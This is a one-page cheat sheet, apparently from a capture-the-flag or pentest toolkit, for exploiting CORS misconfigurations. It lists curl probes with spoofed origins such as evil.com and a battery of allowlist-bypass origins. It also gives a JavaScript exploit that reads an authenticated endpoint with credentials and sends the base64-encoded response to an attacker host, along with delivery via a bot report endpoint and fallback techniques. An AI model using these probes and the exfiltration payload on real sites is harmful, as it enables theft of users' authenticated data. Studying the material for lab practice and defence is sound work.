# Quick reference — the CORS one-glance card

The whole class on a single card — the probes, the verdicts, the
exploit skeleton.

---

## The class

A foreign-origin page reads an authenticated cross-origin response.
Two gates: ACAO (which origin may read) + ACAC (may credentials ride).

## The probes — in order

```bash
# 1. the endpoint carries the flag?
curl -s -b "$CJ" "$BASE/api/me"

# 2. the ACAO — the central measurement
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-(allow-origin|allow-credentials)'

# 3. the cookie — does it ride
curl -s -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'

# 4. the bypass battery (when not open)
for o in 'null' 'https://target.com.evil.com' 'https://eviltarget.com' \
         'https://sub.target.com' 'https://target.com@evil.com'; do
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | grep -i 'access-control-allow-origin'; done
```

## The verdicts

```text
reflected+ACAC    → VULN — credentialed read
null+ACAC         → VULN — opaque-origin read
*  (any)          → NOT vuln — public read
fixed (no bypass) → closed — pivot
no ACAO           → not CORS
```

## The cookie-ride

```text
SameSite=None+Secure → attaches → credentialed read
Lax/Strict/no-SS     → doesn't attach → non-credentialed
```

## The exploit

```html
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))
</script>
```

## The delivery

```bash
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# a data: URL for an airgapped/null-origin case
```

## The readback

```bash
python3 tools/web/oob_listener.py hits   # the exfil hit
```

## The flag gate

```bash
python3 tools/hooks.py pre-flag --value 'FLAG{...}' \
  --source '<the exfil hit>' --evidence '<the bytes>'
```

## The falsifiers

```text
ACAO:* on sensitive endpoint → public — not vuln
ACAC absent or SameSite-gated → non-credentialed — limited
strict allowlist + no bypass   → closed — pivot
```

## The alternates (when CORS is closed)

```text
a JSONP endpoint     → <script src="?callback=">
a ws endpoint        → a websocket read
a postMessage page   → an iframe + listener
an XSS surface       → a same-origin read
an XS-leak           → a side-channel
```

## The confusables

```text
a READ → web-cors    a WRITE → web-csrf    a measure → xs-leaks
a script-serve → JSONP/XSSI    a broadcast → postMessage
```
